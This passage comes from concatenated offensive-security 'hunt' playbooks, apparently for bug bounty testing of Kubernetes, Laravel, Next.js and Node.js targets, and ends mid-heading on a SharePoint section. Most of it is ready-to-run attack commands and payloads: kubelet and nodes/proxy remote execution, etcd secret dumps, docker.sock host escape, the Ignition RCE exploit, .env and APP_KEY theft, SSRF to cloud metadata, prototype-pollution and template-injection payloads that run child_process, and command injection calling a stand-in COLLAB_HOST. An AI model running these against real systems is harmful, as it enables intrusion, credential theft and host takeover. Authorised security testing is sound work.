#   curl -sk -i -X POST "$SRV/exec/$NS/$POD/$CTR?command=id&input=1&output=1&tty=0"   # shows 302 Location

# Container logs (read-only, no stream)
curl -sk "$SRV/containerLogs/$NS/$POD/$CTR"

# Read-only kubelet 10255 — INFO DISCLOSURE ONLY, no exec/run. Do not call this "RCE".
curl -s "http://$TARGET:10255/pods" | python3 -m json.tool 2>/dev/null | head
curl -s "http://$TARGET:10255/metrics" | head
```

**CVE-2020-8558** (host-network trust): on affected kube-proxy, services bound to the node's `127.0.0.1` (incl. the read-only kubelet and other localhost-only services) become reachable from other pods/adjacent hosts via the node IP, defeating the localhost trust boundary — a lateral path to kubelet/etcd that were assumed loopback-only.

---

## Phase 4 — API-Server-Mediated Kubelet RCE (`nodes/proxy`)

When 10250 is firewalled but you hold a token (even a low-priv pod SA) with `nodes/proxy`, route exec **through the API server**:

```bash
SRV="https://$TARGET:6443"; H="-H \"Authorization: Bearer $TOKEN\""
NODE=$(curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)

# /run via the node proxy → output comes straight back
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  "$SRV/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR" -d "cmd=id"

# enumerate every pod on a node via the proxy
curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes/$NODE/proxy/pods"
```
`nodes/proxy` in any bound role is effectively node-wide RCE. **CVE-2022-3294** (kube-apiserver node-address validation): an authenticated user could redirect the API server's proxy connection to an arbitrary host/IP it could reach (proxy-to-internal SSRF / node impersonation) — relevant whenever you can influence node addresses or use the proxy subresource.

---

## Phase 4b — Ingress-NGINX "IngressNightmare" (CVE-2025-1974)
An unauthenticated attacker who can reach the ingress-nginx admission controller (`:8443`, usually cluster-internal but sometimes exposed) injects arbitrary NGINX config via a crafted `AdmissionReview` for an Ingress object -> RCE in the controller pod, whose service account is powerful -> full cluster compromise. Fingerprint controller version (`/healthz`, pod image tag) and map to <1.11.5 / <1.12.1. (CVE-2025-1974 with CVE-2025-1097/1098/24513/24514.)

# etcd holds ALL cluster state. Secrets are plaintext UNLESS EncryptionConfiguration is set.
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 get / --prefix --keys-only 2>/dev/null | head -50
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \
  get /registry/secrets --prefix 2>/dev/null | strings | grep -Ei 'token|password|tls.key|dockerconfig' | head -40

# HTTP/JSON gateway (key/range are base64; "Lw==" == "/")
curl -s "http://$TARGET:2379/v3/kv/range" -H 'Content-Type: application/json' \
  -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHQ=","limit":20}' | python3 -m json.tool

# v2 (older clusters)
curl -s "http://$TARGET:2379/v2/keys/?recursive=true" | python3 -m json.tool 2>/dev/null | head
```
A recovered SA token from etcd → replay against the API server (Phase 6) to confirm grants. **False positive:** a `200` from etcd peer port `2380` or a TLS-required port returning a handshake error is not unauth client access — only a successful `range`/`get` with key data is.

---

# From RCE/LFI inside a pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://kubernetes.default.svc"

# Modern tokens are BOUND (projected): they have an audience + short expiry. DECODE before claiming reuse.
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool

#          "exp" (projected tokens rotate ~1h — a captured token may already be dead),

#          "kubernetes.io/serviceaccount" (pod/node binding — token dies with the pod).

# If aud is e.g. ["vault"] not the api-server audience, it will NOT authenticate to the API → not cluster impact.

# Honest privilege check, then prove with a real read
curl -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
curl -sk "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
```

**EphemeralContainers node-shell escalation:** with `pods/ephemeralcontainers` (or pod `create`), attach a debug container that shares the host namespaces to escape the pod:
```bash
kubectl debug node/$NODE -it --image=busybox      # mounts host root at /host → chroot /host

# or patch an ephemeral container with hostPID/privileged via the API:
curl -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/strategic-merge-patch+json' \
  -d '{"spec":{"ephemeralContainers":[{"name":"x","image":"busybox","command":["sleep","1d"],"securityContext":{"privileged":true}}]}}'
```

---

# docker.sock reachable (SSRF unix://, LFI of socket, or RCE on host)
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json

# Privileged container bind-mounting host root → read/write host fs (host escape)
curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  -X POST http://localhost/v1.41/containers/create?name=poc \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/poc/start
curl -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/poc/logs?stdout=1"

# Impact proof = the NODE's /etc/hostname (differs from the container's hostname).
```

**Container-escape CVEs (gate on runc/version):**
- **CVE-2024-21626 — "Leaky Vessels" (runc ≤ 1.1.11):** a leaked host file descriptor via `/proc/self/fd/<n>` lets a malicious image (`WORKDIR /proc/self/fd/N`) or `runc exec` cwd escape to the host filesystem → host RCE. Test only with an image you control on a build/registry surface where you can influence the Dockerfile.
- **CVE-2019-5736 (runc):** overwrite the host `/proc/self/exe` (the runc binary) from inside a container you can exec into → host root on next runc invocation. Applies to very old runc.
- **CVE-2022-0492 (cgroups v1 `release_agent`):** a container with `CAP_SYS_ADMIN` (or able to mount cgroupfs) writes a `release_agent` that executes on the host → escape. Check container caps first.

---

# Kubernetes Dashboard — correct API base is /api/v1/... UNDER the dashboard service.
curl -sk "https://$TARGET:8443/" | grep -i "kubernetes dashboard"

# token-less probe (skip-login or anonymous-bound dashboard SA):
curl -sk "https://$TARGET:8443/api/v1/secret/default"            # secrets list view
curl -sk "https://$TARGET:8443/api/v1/pod/default"               # pods list view
curl -sk "https://$TARGET:8443/api/v1/namespace"                 # namespaces

# (paths are <resource> not <resource>/<id>; a 200 with real items = unauth dashboard data access)

# Helm 2 / Tiller remnant — gRPC on 44134, historically NO auth → full cluster as Tiller's SA
nmap -p 44134 -sV $TARGET

# helm --host $TARGET:44134 ls   # if it answers, Tiller is exposed → install/delete any release

# Validating/Mutating admission webhooks — enumerate to find bypassable policy or SSRF-able webhook URLs
curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations" -H "Authorization: Bearer $TOKEN"

# A webhook clientConfig.url pointing at an external/attacker-influenced host = SSRF/bypass surface.
```

---

## Chain Table

| K8s finding | Chain to | Impact |
|-------------|----------|--------|
| API anon **with confirmed secret read** | extract SA/TLS/app creds | Full cluster compromise |
| `nodes/proxy` token | API-server-mediated `/run` → pod RCE → SA token | Node-wide RCE → escalation |
| Kubelet 10250 `/run` | exec in any pod → steal SA token → API | Cluster privilege escalation |
| etcd 2379 unauth | dump all Secrets (if unencrypted) → replay token | Full credential dump |
| docker.sock | privileged container + host bind-mount | Host root |
| CVE-2024-21626 (runc) | malicious image/exec → host FD escape | Container → host root |
| EphemeralContainers / pods create | privileged/hostPID debug container | Pod → node escape |
| Projected SA token (aud matches) | API access scoped to its real RBAC | Depends on RBAC — verify first |
| Tiller 44134 exposed | helm install as Tiller SA | Cluster-admin if Tiller is privileged |

---

## False-Positive Killers

- **Anon `200` ≠ cluster-admin.** RBAC-filtered list returns `200`/empty `items`. Require SelfSubjectRulesReview to show the verbs, then an actual Secret value read.
- **10255 ≠ 10250.** Read-only kubelet has no exec/run. "Kubelet RCE" must come from a `/run` output or a completed `/exec` stream on 10250.
- **`/exec` plain-POST returns 302, not output.** Seeing no body is NOT "patched" — follow the stream (kubeletctl/websocat) before concluding either way.
- **Projected/bound SA token may be dead or wrong-audience.** Decode `exp` and `aud`; a Vault/OIDC-audience token will not authenticate to the API server.
- **etcd plaintext assumption.** If `EncryptionConfiguration` is enabled, Secret values in etcd are ciphertext — don't claim "plaintext secrets" without showing decoded bytes.
- **Version-gated CVEs.** Confirm `gitVersion` (Phase 1) / runc version before asserting CVE-2018-1002105, -2024-21626, -2019-5736, etc. A version match is a lead; the PoC output is the proof.
- **Dashboard `200` on the HTML shell** is just the login page; only a `200` with real resource JSON under `/api/v1/<resource>/<ns>` proves token-less data access.

---

## Validation Checklist

- [ ] **API anon:** SelfSubjectRulesReview shows privileged verbs AND a real Secret value was read (redacted).
- [ ] **Kubelet:** literal `id`/`hostname` output returned from 10250 `/run`, or a completed `/exec` stream — not a bare 302.
- [ ] **nodes/proxy RCE:** command output returned through `/api/v1/nodes/<node>/proxy/run/...` with your token.
- [ ] **etcd:** decoded Secret bytes shown (proves unencrypted + readable), not just a key listing.
- [ ] **docker.sock / escape:** the NODE's host file content retrieved (distinct from container), or runc-escape PoC output.
- [ ] **SA token:** `aud`/`exp` decoded and shown valid; impact bounded to its real RBAC.
- [ ] **OOB:** any outbound/SSRF hop confirmed via Collaborator/interactsh subdomain.

**Severity:**
- API anon→secret read, kubelet/nodes-proxy RCE, etcd dump, docker.sock/runc escape, CVE-2018-1002105: **Critical**
- Dashboard token-less data access, exposed Tiller: **High**
- Read-only kubelet 10255, anon `/version`/`/pods` info disclosure: **Medium**


## SOURCE: hunt-skills/hunt-laravel/SKILL.md

## Crown Jewel Targets

Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).

**Highest-value findings:**
- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
- **.env exposure** — `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO

---

# Laravel-specific indicators
curl -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

# Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Check error page (trigger 404)
curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"
```

---

# Step 1: Check if debug mode is enabled (Whoops error page)
curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

# Step 2: Check Ignition endpoint
curl -s "https://$TARGET/_ignition/health-check" | head -5

# Tool: ambionics/laravel-ignition-rce
git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"

# Manual test — send solution request
curl -s -X POST "https://$TARGET/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
    }
  }'
```

---

# Telescope — request/response logs, DB queries, jobs, cache, events
curl -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
curl -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
curl -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50

# Horizon — queue worker dashboard
curl -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50

# Common paths
for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```

---

# Direct .env access
curl -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl -s "https://$TARGET/.env.production"
curl -s "https://$TARGET/.env.backup"
curl -s "https://$TARGET/.env.local"

# Also check
curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
```

---

## Phase 4b — Environment override via query args (CVE-2024-52301)
When `register_argc_argv=On` (php.ini), Laravel parses the query-string as CLI args, so `?--env=` overrides `APP_ENV` over HTTP -> flip the app into `local`/`testing` config (debug on, seeded creds, weaker guards).
```bash
curl -s "https://$TARGET/?--env=local"          # force debug/local config
curl -s "https://$TARGET/login?--env=testing"    # swap to testing DB/config

# Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

# Modify user ID → should fail if properly signed
curl -s "${SIGNED_URL/user=123/user=999}"

# Test signature bypass: remove signature entirely
curl -s "${SIGNED_URL/&signature=VALID_SIG/}"

# Test: does the app validate ALL parameters or just some?
curl -s "${SIGNED_URL}&extra=malicious"
```

---

# Profile update
curl -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

# Registration
curl -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@new.com", "password": "test123", "verified": true, "admin": 1}'
```

---

# Get the app key
APP_KEY=$(curl -s "https://$TARGET/.env" | grep "^APP_KEY=" | cut -d= -f2)

# python3 laravel_cookie_forge.py --key "$APP_KEY" --payload "PHPGGC_PAYLOAD"
```

---

## Chain Table

| Laravel finding | Chain to | Impact |
|----------------|----------|--------|
| Debug mode ON | CVE-2021-3129 Ignition RCE | Critical RCE |
| Telescope accessible | Read API keys, DB queries, env vars | High - credential theft |
| Horizon accessible | Read failed job payloads | High - PII/token exfil |
| .env exposed with APP_KEY | Forge session cookie → ATO | Critical ATO |
| Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
| Mass assignment | Set is_admin=true → privilege escalation | Critical |

---

## Validation

✅ Ignition RCE: `id` command output returned in response
✅ Telescope: API responses contain DB queries with credentials or user tokens
✅ APP_KEY: Forged session cookie accepted, returns another user's profile
✅ Mass assignment: `is_admin: true` accepted, account now has admin privileges

**Severity:**
- Ignition RCE: Critical
- Telescope/Horizon with sensitive data: High
- .env with APP_KEY: Critical
- Mass assignment to admin: Critical


## SOURCE: hunt-skills/hunt-nextjs/SKILL.md

## Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client

---

## Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

---

# Find action IDs in HTML source or JS bundles
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# If it returns data or mutates state → auth enforcement is client-side only
```

---

# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

### Middleware bypass via `x-middleware-subrequest` (CVE-2025-29927)
Next skips middleware execution entirely when this header asserts an internal subrequest — bypassing auth/redirect middleware on gated routes.
```bash
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

# Basic SSRF test — internal metadata
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"

# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches URLs allowed by `images.remotePatterns` / `images.domains` in
`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
returns an *optimized image*, not the upstream response body, so a status code
alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
Collaborator subdomain** (above), or by body-diffing a known-internal vs
known-external target. Do not report on status code.

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,

# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"

# 1) Poison with the marker
curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null

#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected

#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

## Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation.

```bash

# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |

---

## Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium


## SOURCE: hunt-skills/hunt-nodejs/SKILL.md

## Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

## Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

# Confirm Node.js/Express
curl -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

# Check for package.json / node_modules exposure
curl -s "https://$TARGET/package.json"
curl -s "https://$TARGET/package-lock.json"
curl -s "https://$TARGET/node_modules/.package-lock.json"

# Error-based version detection
curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

# JSON body injection — test if __proto__ is accepted
curl -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# Constructor prototype
curl -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# URL query param injection (qs library)
curl -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

# Confirm pollution: does a subsequent request reflect the polluted key?
curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
```

---

# Sink 1: child_process via options.shell pollution
curl -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

# Sink 2: lodash template pollution (CVE-2021-23337)
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

# If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

# Spoof IP to 127.0.0.1 (localhost bypass)
curl -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

# Spoof to internal IP range
curl -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Rate limit bypass via rotating fake IPs
for i in $(seq 1 50); do
  curl -s https://$TARGET/api/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

---

# Test basic: <%= 7*7 %> should return 49
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

# EJS RCE payload
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

# Pug SSTI
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

# Handlebars — prototype pollution via template
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
```

---

# Basic injection test
curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

# OOB via DNS
curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

# If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl -s "https://$TARGET/api/file?path=/proc/self/environ"
curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

# Also check:
curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---

## Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---

## Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)


## SOURCE: hunt-skills/hunt-sharepoint/SKILL.md

## Crown Jewel Targets

SharePoint Server (on-prem) is one of the richest enterprise attack surfaces in 2025-2026 bug bounty / red-team work. Three forces converge:

